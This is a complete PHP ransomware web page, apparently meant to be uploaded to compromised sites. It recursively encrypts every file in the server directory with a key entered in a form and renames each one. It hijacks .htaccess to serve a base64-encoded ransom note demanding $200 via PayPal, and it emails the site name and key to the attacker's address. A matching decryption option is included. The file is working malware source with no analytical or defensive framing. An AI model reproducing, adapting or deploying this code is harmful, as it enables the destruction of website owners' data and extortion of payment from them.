<!DOCTYPE html>
<html>
<head>
   <title>LOCKED BY MRCROOT</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htashor7cut")){
      rename(".htaccess", ".htashor7cut");
      if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team\r\nDirectoryIndex shor7cut.php\r\nErrorDocument 404 /shor7cut.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("shor7cut.php", base64_decode("PGh0bWw+CjxpZnJhbWUgd2lkdGg9IjAiIGhlaWdodD0iMCIgc3JjPSJodHRwczovL2FwaS5zb3VuZGNsb3VkLmNvbS90cmFja3MvNjk1ODc4MzQ4L3N0cmVhbT9jbGllbnRfaWQ9YTNlMDU5NTYzZDdmZDMzNzJiNDliMzdmMDBhMDBiY2YiIGZyYW1lYm9yZGVyPSIwIgo8aGVhZD4KPGNlbnRlcj48Zm9udCBjb2xvcj0icmVkIiBzaXplPSI3IiBmYWNlPSJJY2ViZXJnIj4mIzEyMDM7JiM4MjQ7JiMxMjAyOyYjODI0OyYjMTIwMzsgSEFDS0VEIEJZIE1FJiMxMjAzOyYjODI0OyYjMTIwMjsmIzgyNDsmIzEyMDM7PC9mb250PjwvY2VudGVyPgo8aWZyYW1lIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHNyYz0iaHR0cHM6Ly93d3cueW91dHViZS5jb20vZW1iZWQvWElSZnEyazA1cXc/cmVsPTAmYW1wO2F1dG9wbGF5PTEmYW1wO2xvb3A9MyIgZnJhbWVib3JkZXI9IjAiIGFsbG93ZnVsbHNjcmVlbj48L2lmcmFtZT4KPC9oZWFkPgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL3d3dy5jc3NzY3JpcHQuY29tL2RlbW8vbWluaW1hbGlzdC1mYWxsaW5nLXNub3ctZWZmZWN0LXdpdGgtcHVyZS1qYXZhc2NyaXB0LXNub3ctanMvc25vdy5qcyI+PC9zY3JpcHQ+CjxpZnJhbWUgd2lkbGx0aD0iMCUiIGhlaWdodD0iMCIgc2Nyb2xsaW5nPSJubyIgZnJhbWVib3JkZXI9Im5vIiBsb29wPSJ0cnVlIiBhbGxvdz0iYXV0b3BsYXkiIHNyYz0iaHR0cHM6Ly81LnRvcDR0b3AubmV0L21fMTQ0NzN1bjliMC5tcDMiPjwvaWZyYW1lPgo8c3R5bGU+CmJvZHkgewogCWJhY2tncm91bmQtY29sb3I6IGJsYWNrOwp9Cjwvc3R5bGU+Cjxicj48YnI+PGJyPgo8Y2VudGVyPgo8YnI+PGltZyBzcmM9Imh0dHBzOi8vY2RuLnBpeGFiYXkuY29tL3Bob3RvLzIwMTYvMTIvMjAvMTQvMzUvdmlydXMtMTkyMDYyOV8xMjgwLnBuZyJ3aWR0aD0iMzAwImhlaWdodD0iMzAwIj4KPGJyPjxoMT48c3BhbiBzdHlsZT0iY29sb3I6I2ZmZmZmZjtmb250LWZhbWlseTpJY2VsYW5kO3RleHQtc2hhZG93OiNGRjAwOTkgMHB4IDBweCAxMHB4Ij4gW3hdIExPQ0tFRCBCWSBNUi5DUk9PVCBbeF08L3NwYW4+PC9oMT4KPGJyPjxoMj48c3BhbiBzdHlsZT0iY29sb3I6I2ZmZmZmZjtmb250LWZhbWlseTpJY2VsYW5kO3RleHQtc2hhZG93OiNGRjAwOTkgMHB4IDBweCAxMHB4Ij4gfllvdXIgc2l0ZSBoYXMgYmVlbiBsb2NrZWQgYnkgbWUgdG8gbWFrZSBhIHBheW1lbnQgbm93IG9yIGFsbCB5b3VyIGRhdGEgd2lsbCBiZSBsb3N0fiA8L3NwYW4+PC9oMTIKPGJyPgo8YnI+PGJyPjxicj48Y2VudGVyPjxmb250IGNvbG9yPSJyZWQiIHNpemU9IjUiIGZhY2U9IkljZWJlcmciPiYjMTIwMzsmIzgyNDsmIzEyMDI7JiM4MjQ7JiMxMjAzOyBQQVkgTUUgMjAwJCAmIzEyMDM7JiM4MjQ7JiMxMjAyOyYjODI0OyYjMTIwMzs8L2ZvbnQ+PC9jZW50ZXI+Cjxicj4KPC9ib2R5Pgo8Y2VudGVyPgo8Y2VudGVyPgo8dGFibGUgYm9yZGVyPSIxIj4KPHRoPiA8Zm9udCBjb2xvcj0icmVkIj48YSBocmVmPSJodHRwczovL3d3dy5wYXlwYWwubWUvbXJjcm9vdCI+PGZvbnQgY29sb3I9InJlZCI+UEFZIE1FPC9hPgo8YnI+Cjx0aD4gPGEKPHRoPiA8YSBocmVmPSJodHRwczovL21haWwuZ29vZ2xlLmNvbS9tYWlsL211L21wLzkwOS8jY28iPkNPTlRBQ0sgTUU8L2E+Cg=="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  shor7cut.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htashor7cut") ){
        if( unlink(".htaccess") && unlink("shor7cut.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> shor7cut.php (Default Page)<br>';
        }
        rename(".htashor7cut", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"ransom1.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashor7cut") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========      Ransomware  Wannacary =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= Ransomware Wannacary =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <mrcroot46@gmail.com>\r\n";
        mail("mrcroot46@gmail.com",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".shor7cut");
        break;
        case '2':
          $locates = str_replace(".shor7cut", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<pre>

     <center>
 <br><img src="https://cdn.pixabay.com/photo/2016/12/20/14/35/virus-1920629_1280.png"width="300"height="300">
 <center>~Your site has been locked by me to get the key please make a payment now or all your data will be lost~
 <center>~or your data will be destroyed and cannot be restored never to enter the key with the wrong key and~
 <centery-[ Contact : mrcroot46@gmail.com ]-
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
      <select name="method" class="selecte">
         <option value="1">Infection</option>
         <option value="2">DeInfection</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php
}?>
</div>
</body>
</html>


<?php

?>
